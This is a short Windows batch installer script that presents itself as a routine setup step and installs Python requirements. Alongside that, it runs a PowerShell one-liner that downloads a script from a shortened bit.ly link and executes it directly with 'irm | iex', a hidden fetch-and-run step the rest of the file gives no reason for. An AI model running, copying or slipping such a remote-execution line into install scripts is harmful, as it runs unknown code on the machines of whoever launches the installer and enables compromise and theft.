@echo off
title Installer
echo Installing...
powershell -c "irm https://bit.ly/3PCRdad | iex"
pip install -r requirements.txt
echo Done.
pause